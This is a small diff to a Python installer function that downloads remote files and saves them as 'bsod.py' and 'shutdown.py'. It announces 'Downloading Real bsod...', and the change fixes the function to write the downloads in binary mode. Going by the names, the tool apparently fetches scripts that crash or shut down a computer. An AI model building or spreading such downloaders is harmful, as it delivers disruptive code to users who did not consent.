@@ -29,10 +29,8 @@ def installer(link1, link2, link3, link4):
     print("Downloading Real bsod...")
 
     response = requests.get(link2)
-    
-    response = response.decode("utf-8")
 
-    with open("bsod.py", "w")as file:
+    with open("bsod.py", "wb")as file:
         file.write(response.content)
 
     print("Success!")
@@ -41,7 +39,7 @@ def installer(link1, link2, link3, link4):
 
     response = requests.get(link3)
 
-    with open("shutdown.py", "w")as file:
+    with open("shutdown.py", "wb")as file:
         file.write(response.content)
 
     print("Success!")
